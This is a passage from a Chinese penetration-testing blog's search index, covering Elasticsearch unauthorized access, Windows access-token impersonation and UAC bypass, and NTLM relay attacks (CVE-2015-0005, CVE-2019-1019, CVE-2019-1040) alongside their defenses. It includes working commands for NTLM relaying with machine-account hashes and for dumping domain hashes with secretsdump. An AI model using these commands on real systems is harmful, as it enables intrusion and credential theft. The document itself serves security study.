","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Elasticsearch 未授权访问漏洞 Elasticsearch 是 java 编写的企业级搜索服务，启动此服务默认会开放 HTTP 9200 端口，可被非法操作数据。 nmap -sV -p 9200 IP http://IP:9200/ http://IP:9200/_nodes 查看节点数据 http://IP:9200/_cat 默认开启的 9200 端口和使用的端口不对外公布，或架设内网环境。或者防火墙上设置禁止外网访问 9200 端口为 elasticsearch 增加登录验证，可以使用官方推荐的shield 插件，该插件为收费插件，可试用 30 天，免费的可以使用 elasticsearch-http-basic，searchquard 插件 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"CVE-2014-3120 https://geekby.xyz/2019/06/08/elasticsearch-ming-ling-zhi-xing-lou-dong/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"CVE-2015-1427 https://geekby.xyz/2019/06/08/elasticsearch-groovy-sha-he-rao-guo/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:4","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"CVE-2015-3337 https://geekby.xyz/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:5","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"CVE-2015-5531 https://geekby.xyz/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong-1/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:6","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["内网渗透"],"content":"域渗透之 Windows Access Token 攻击","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"域渗透之 Windows Access Token 攻击 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:0:0","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"Windows Access Token 简介 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:0","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"Windows Access Token 概念 微软官方的定义如下： An access token is an object that describes the security context of a process or thread.The information in token includes the identity and privileges of the user account associatedwith the process or thread. Windows Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后，都会生成一个 Access Token，这个 Token 在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了 A 用户创建一个进程而该进程没有 B 用户的权限。当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。 Access Token 分为两种(主令牌、模拟令牌) ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:1","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"Windows Access Token 分类 1、primary token 这种令牌通常用于本地及远程 RDP 登录 2、impersonation token 这种则通常用于各种非交互式的登录，比如，netuse，wmi，winrm等等 登录方式 交互式登录 console login (type 2) rdp login (type 10) psexec (type 2) 网络登录 wmi (type 3) winrm (type 3) ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:2","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"Windows Access Token 组成 用户帐户的安全标识符(SID) 用户所属的组的 SID 用于标识当前登录会话的登录 SID 用户或用户组所拥有的权限列表 所有者 SID 主要组的 SID 访问控制列表 访问令牌的来源 令牌是主要令牌还是模拟令牌 限制 SID 的可选列表 目前的模拟等级 其他统计数据 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:3","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"关于 SID 安全标识符(Security identifiers)，简称为 SID，分别是 OwnerSid 和 GroupSid。所谓 SID 就是每次当我们创建一个用户或一个组的时候，系统会分配给该用户或组一个唯一 SID，当你重新安装系统后，也会得到一个唯一的 SID。SID 是唯一的，不随用户的删除而分配到另外的用户使用。请记住，SID 永远都是唯一的。SIF 是由计算机名、当前时间、当前用户态线程的 CPU 耗费时间的总和三个参数决定以保证它的唯一性。 例：S-1-5-21-1763234323-321265751-1234321321-500(whoami/user) ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:4","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"Windows Access Token 产生过程 用户使用凭据(用户密码)进行认证 –\u003e 登录 session 创建 –\u003e windows 返回用户的 sid 和用户所在组的 sid –\u003e LSA 创建一个 Access token —\u003e 使用凭据成功认证 –\u003e 登录 session —\u003e token —\u003e 进程、线程 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:1:5","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"后渗透中的令牌模拟 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:2:0","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"cobalt strike 模拟令牌 使用 steal_token 模拟令牌，rev2self 恢复令牌 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:2:1","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"metasploit 模拟令牌 incognito 模块，同样 rev2self 恢复令牌 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:2:2","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"获取任意进程的令牌权限 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:3:0","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"手动令牌模拟 模拟过程： openprocess() –\u003e openprocesstoken() –\u003e impersonateloggedonuser() –\u003e duplicatetokenex() –\u003e createprocesswithtokenw() openprocess openprocesstoken impersonateloggedonuser duplicatetokenex createprocesswithtokenw ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:3:1","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"Bypass Protect Process 并不是所有的进程都是可以被操作的 只获取 system 权限的进程: get-token where-object {$_.username-eq 'NT AUTHORITY\\SYSTEM' -and $_ownername -ne 'NT AUTHORITY\\SYSTEM'} | select-object processname, processsid | format-table 然后经过测试发现像 csrss、 service、 wininit、smss 等 token 获取失败。 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:3:2","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"使用 Access Token 进行 BypassUAC Fuzzy Security 利用 Windows 令牌实现 UAC 绕过 https://github.com/fuzzysecurity/powershell-suit/blob/master/UAC-TokenMagic.ps1 ","date":"2020-05-11","objectID":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/:4:0","tags":["域安全","内网渗透","Access Token"],"title":"域渗透之 Windows Access Token 攻击","uri":"/2020/05/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-windows-access-token-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"NTLM 中间人攻击原理及实验","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"NTLM Relay ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:0:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1 前言 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1.1 背景介绍 NTLM Relay，中间人攻击或重放攻击是一个意思。 B 是一个 smb 服务器，A 来进行认证，B 将 A 的认证信息转发到 C 上，如果 A 的凭证在 C 上认证成功就能进行下一步操作，如创建服务执行命令。如果在域中控制了某些常用服务，如：WEB OA 系统、文件共享等服务则可以尝试使用 SMB 中继攻击来引诱域管理员访问达到获取其他机器权限的目的。 2001 年，最早由 Dystic 实现，SMBRelay 2004 年，发展为 HTTP -\u003e SMB，BlackHat，未开源 2007 年，HTTP -\u003e SMB 被集成到 MetaSploit 2008 年，HTTP -\u003e HTTP的 NTLM 攻击被实现(MS08-067) ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1.2 认证过程 两端模型： 三端模型： 在域环境下的 NTLM Relay 的模型： ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1.3 HTTP -\u003e SMB 攻击实验 1.3.1 nmap 探测 SMB 签名 nmap 扫描： nmap -p445 --script=smb-security-mode.nse IP --open 1.3.2 使用 ntmlrelayx.py 测试 ntmlrelayx.py 脚本在 empire 包中 ntlmrelayx.py -tf hosts.txt -socks -smb2support 注意 发起攻击时，HTTP -\u003e SMB，开启 80 端口，需要保证端口未被占用 攻击成功后，会在攻击机本地开启 1080 socks 端口，通过 proxychain 等代理工具，即可控制目标机器。 # mac 下 proxychain-NG proxychains4 /Users/Geekby/opt/anaconda3/bin/python secretsdump.py pentest.com/Administrator@172.16.147.132 注意 进行认证时会提示输入密码，留空即可使用 relay 后的凭据进行认证。 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:3","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1.4 Hot Potato Hot Potato 是一个经典的利用 NTLM Relay 获取高权限用户控制权的例子，可以参考「Potato 家族提权分析」这篇文章。 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:4","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1.5 NTLM Relay 防御 目前有许多针对 NTLM 重放攻击的防御措施，主要包括以下几种： SMB \u0026 LDAP 签名 EAP (Enhanced Protection Authentication) LDAPS Channels Server target SPN Validation 1.5.1 SMB \u0026 LDAP 签名 完成认证后，应用服务器和客户端之间的所有流量都有签名验证保护；用户签名的会话密钥基于客户端的 NTLM 值生成，应用服务器在 NETLOGON 阶段从 DC 服务器获取；客户端采用和 DC 相同的算法，基于自身的 NTLM 值生成会话密钥，因此中间人攻击没有办法获取会话密钥 1.5.2 EAP (Enhanced Protection Authentication) NTLM 认证和一个安全通道进行绑定，在 NTLM 认证过程中，最后的 NTLM 认证数据报文包含一个目标应用服务器的证书摘要，这个摘要使用客户端的 NTLM 值进行签名保护，可以防止伪造证书的攻击。 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:5","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1.6 关于 NTLM 协议的一些总结 NT Hash = md4(unicode(hex(password))) NTLMv2 Hash = HMAC-MD5(unicode(hex(upper(username+domain))), NT Hash) NTProofStr = HMAC-MD5(challenge + 数据, NTLMv2 Hash) Session Key = HMAC_MD5(HMAC_MD5(NTLMv2 Response + Challenge, NTLMv2 Hash), NTLMv2 Hash) MIC = HMAC_MD5(NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE, Session key) ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:6","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"2 CVE-2015-0005 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:2:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"2.1 原理 应用服务器在收到用户客户端的认证信息后，由于本身没有存储用户的口令信息，所以必须依赖域服务器进行认证，将收到的认证信息发送给域服务器，这个过程基于 NETLOGON 协议。该协议在应用服务器和域服务器之间建立一个安全会话，安全会话共享密钥基于应用服务器主机账号的口令 NTLM 生成。 2.1.1 NETLOGON 步骤 均为 RPC 远程向认证服务器调用 NetrLogonSamLoginEx NetrLogonSamLogonWithFlags NetrLogonSamLogon NetrLogonSamLogoff 2.1.2 攻击场景 win10x64en$ 上的用户 eviluser ，访问内服务器 win2008R2$ 的 SMB 服务，采用 NTLM 认证方式，域服务器为 Win2016-dc01$ ，认证过程概括如下: win10x64en$ 首先向 win2008R2$ 的 SMB 445 端口发起一个连接 NTLM_NEGOTIATE，协商使用 NTLM 认证方式； win2008R2$ 收到后，发送 NTLM CHALLENGE 返回给 win10x64en$； win10x64en$ 收到 NTLM CHALLENGE 后，向 win2008R2$ 发送一个 NTLM 认证报文； Win2008R2$ 和域控服务器之间共享了 Win2008R2$ 的口令 NTLM，以此生成会话密钥，创建一个 NETLOGON 安全会话。Win2008R2$ 通过 RPC 调用域服务器的 NetrLogonSamLogonWithFlags 函数，并将 win10x64en$ 发送过来的认证信息加上此前的挑战信息全部填装进入作为参数； 域服务器收到信息后，验证认证信息，如果认证合法则返回 STATUS_SUCCESS； 如果 NetrLogonSamLogonWithFlags 调用成功，则应用服务器会返回 NETLOGON_VALIDATION 数据结构，该结构的结尾可能是以下结构中的一种: NETLOGON_VALIDATIN_SA_FO ，NETLOGON_VALIDATION_SAM_INFO2，NETLOGON_VALIDATION_SAM_INFO4。在这个结构中有一个重要的数据，就是 SessionKey ，用于用户客户端和应用服务器之间的签名、加密等； SessionKey 基于客户端用户的口令 NTLM 生成，应用服务器从 DC 获取，客户端用户自己采用相同的算法生成，因此应用服务器和客户端不需要交互 SessionKey; 第二个参数为主机名(微软的解释 「Computer Name: The Unicode string that contains the NetBIOS name of the client computer calling this method」)，主机名为调用该函数的客户端主机名，也就是应用服务器通过 RPC 远程调用的该函数，因此该主机名理论上应该与应用服务器和域服务器之间安全会话密钥的主机账号应该一致。 所以任何一台域内主机，只要能拿到此前用户和应用服务器的认证信息，就可以向域服务器发起 NETLOGON，从而获取 SessionKey，这样后面可以伪造应用服务器和客户端用户之间的数据签名，满足中间人攻击。 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:2:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"2.2 实战 利用 impacket 中的 smbrelayx 进行中间人攻击，如果目标机器强制使用 SMB 签名，该模块会使用 NETLOGON 直接获取签名用的 sessionKey 环境： 攻击机（非域内主机）：192.168.68.24 客户端服务器（被中间人攻击的服务器）： SERVER-2008 目标主机、应用服务器： Windows Server 2012 - 172.16.147.130 信息 如果是非域主机，需要指定当前域内任意一台主机的 hash，且指定域控的 IP。 python2 smbrelayx.py -h 172.16.147.130 -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130 可以使用 -e 参数指定目标机器要执行的文件，不指定的话，默认 dump 下目标机器的 Hash，-c 可以指定要执行的命令。 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:2:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"2.3 防御 影响 Windows Server 2012 及以下，对个人 PC 无影响 微软发布了补丁 MS15-027，针对这个漏洞进行了修补，对 ComputerName 和 NetBIOS 这 2 个字段进行了校验，并且对这个消息认证块进行了签名校验 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:2:3","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3 CVE-2019-1019 在 CVE-2015-0005 漏洞被修补后，域服务器会校验 ComputerName 和 NetBIOS 这 2 个字段是否一致。但是如果 ComputerName 字段缺失，则域服务器会接受，而且不会对认证消息进行完整性校验(MIC) 。 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:3:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3.1 原理 由于 NTLM_AUTHENTICATION 报文中的很多信息，包括 ComputerName 字段信息，是从 NTLM-CHALLENGE 中拷贝获取，因此在攻击者可以截获由应用服务器发送给客户端的挑战信息，并将 ComputerName 字段进行删除，客户端收到挑战信息后，由于找不到 ComputerName 字段，会导致随后的 NTLM_AUTHENTICATION 也不包含该字段。 通过配置，可以让 NTLM 启用完整性校验，即在认证消息中添加一个字段 MIC(Message Integrity Code)，在新版本中这是默认开启的功能。MIC 是用来保护 NTLM 认证报文的完整性，即 NTLM_CHALLENGE。 MIC 通过基于 SessionKey 会话秘钥的 HMAC_MD5 算法实现完整性保护，而此前的分析中，我们有能力方法获取这个 SessionKey，因此修改后重新计算 MIC 即可。 客户端发起到应用服务器的 NTLM_NEGOTIATE，被重放攻击者捕获 攻击者将 NTLM_NEGOTIATE 转发给真正的应用服务器，也即我们的攻击目标 应用服务器返回一个 NTLM_CHALLENGE 给攻击者 重放攻击者将 NTLM_CHALLENGE 中的 ComputerName 字段去掉，然后转发给客户端 客户端收到修改后的 NTLM_CHALLENGE ，基于这些信息构造 NTLM_AUTHENTICATE ，将认证信息发送给重放攻击者，此时认证消息已经包含 MIC 重放攻击者向域服务器发起一个 NETLOGON 会话请求，由于认证消息中 ComputerName 字段缺失，域服务器不进行完整性校验，认可该认证消息，并返回一个 Sessionkey 重放攻击者重新计算 MIC ，并将新的 NTLM_AUTHENTICATE 发送给应用服务器 应用服务器收到 NTLM_AUTHENTICATE 后，校验 MIC，然后向域服务器发起 NETLOGON 会话请求，域服务器返回认证成功的响应，其中包含会话密钥，这个会话密钥和第 6 步中的会话密钥相同 重放攻击者成功地与应用服务器建立了一个带签名的会话，获取了客户端用户在应用服务器上的访问权限，如果客户端用户是管理员，而应用服务器是域服务器，则重放攻击者具备了在域服务器(应用服务器)上的管理员权限(客户端)。 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:3:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3.2 实战 利用 impacket 中的 ntlmrelayx.py 进行中间人攻击，使用 -remove-target 参数。 python3 ntlmrelayx.py -h 172.16.147.130 -remove-target --enum-local-admins -smb2support -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:3:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4 CVE-2019-1040 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:4:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4.1 原理 在安装了 CVE-2015-0005 的补丁后，系统会校验 NetBIOS 的名称和 NetrLogonSamLogonWithFlags 函数的 ComputeName 参数是否相同。因此，此前通过修改 ComputerName 来获取 SessionKey 的方法失效。 但是如果认证信息中的 NetBIOS 被删除或者消失后，认证服务器不会再进行前面的名字校验，也就是说我们再修改 ComputerName 参数，能达成 CVE-2015-0005 漏洞的效果，从而获取会话密钥。 针对这种情况，可以通过配置“服务器拒绝任何没有 NetBIOS 的请求”来阻止此类攻击。但是在 NTLMv1 中，NTLM 消息块结构体中，本来就没有这个字段，因此这种攻击在 NTLMv1 场景中难以通过策略或者补丁来杜绝，仍然存在很大的脆弱性。 客户端和服务器在 NTLM 协商时，通过下图中 NegotiatFlags (即 msvAvFlags 字段)来标识是否需要 MIC 来保护会话的完整性，见下图中红色框标识。 SMB 客户端在 NTLM 认证时，默认设置需要 MIC 进行完整性校验保护。直观而言，一般会有几种方式对抗 MIC，一是修改 MIC，前提条件是获取会话密钥，在前面我们看到：如果配置了防护策略，通过删除 NetBIOS 不能获取会话密钥；二是直接丢弃 MIC，这时需要将 msVAvFlags 字段中的标志位同样进行修改，以及版本信息，因为有些版本默认是必须要有 MIC。 msvAvFlags 字段的定义，查看微软知识库，如果为 0x00000002 表示客户端通过 MIC 来保护数据报文的完整性 msvAVFlags 字段由用户的 NTLM 散列值进行签名保护，因此不能修改 msvAVFlag 字段。实际中非常神奇，域服务器并不真正在乎 MIC 和 Version 信息是否存在，如果存在，则校验，如果不存在则不校验。 上述的攻击方式，可以通过配置进行阻止，即如果 msvAVFlags 字段表明有 MIC 完整性校验，就必须要有 MIC 的存在，而且进行校验。但是在实际应用场景中，仍然存在一些隐患，例如 MacOS 、Linux 系统中的 FireFox 默认情况下，不添加 MIC。 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:4:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM 